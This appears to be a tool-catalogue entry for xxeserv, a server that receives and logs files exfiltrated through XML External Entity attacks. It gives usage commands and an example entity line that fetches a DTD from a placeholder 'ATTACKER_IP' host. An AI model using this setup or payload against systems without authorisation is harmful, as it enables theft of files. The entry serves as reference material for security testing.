---
name: "xxeserv"
categories:
  - blackarch-networking
version: "14.2c7f444"
homepage: "https://github.com/staaldraad/xxeserv"
packaged-by: [blackarch]
blackarch-builddate: "2024-10-01"
build-system: go
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "staaldraad/xxeserv"
github-stars: 344
github-pushed: "2024-01-03"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# xxeserv

> Minimal FTP and HTTP server purpose-built to catch, keep alive, and log data exfiltrated through XXE payloads.

## What it's for

xxeserv (XXE-FTP) is a small Go server that forms the receiving end of an XML External Entity attack: it runs an FTP service that accepts file data pushed by an XXE payload and answers in a way that keeps the client sending — including Java applications, whose FTP handling otherwise hangs after the first block. Everything received is logged, and the server keeps listening so multiple files can be retrieved in one session. Its HTTP/HTTPS side serves the DTD payloads that drive the exfiltration, and a unique "uno port" mode runs FTP, HTTP and HTTPS on a single port for targets that only allow one outbound connection. It does not find or exploit XXE itself — you craft the payload and point it here.

## Typical use cases

### Listen for FTP exfiltration and log it

Receive files pushed out by an XXE payload over FTP.

```
xxeserv -p 2121 -o loot.txt
```

Outcome: FTP listener on port 2121 that accepts data connections without rejecting them (keeping Java-based targets streaming instead of hanging); everything the payload pushes is appended to loot.txt, and the server stays up for multiple retrievals in one session.

### Serve the DTD payload over HTTP next to the FTP catcher

Host the out-of-band DTD on the same machine that catches the data.

```
xxeserv -w -wp 2122 -wd /srv/xxe
```

Outcome: An HTTP server on port 2122 serving files from /srv/xxe, so an entity like `<!ENTITY % remote SYSTEM "http://ATTACKER_IP:2122/xxe.dtd">` fetches its DTD from the same host that is logging the FTP exfiltration.

### Run everything through one port

Use when the target permits only a single outbound port.

```
xxeserv -uno 443
```

Outcome: A single listener on port 443 that detects on connect whether the client is speaking FTP, HTTP, or HTTPS and answers accordingly — serving the DTD and receiving the exfiltrated data through the one allowed port.

*No corpus evidence — derived from upstream documentation.*
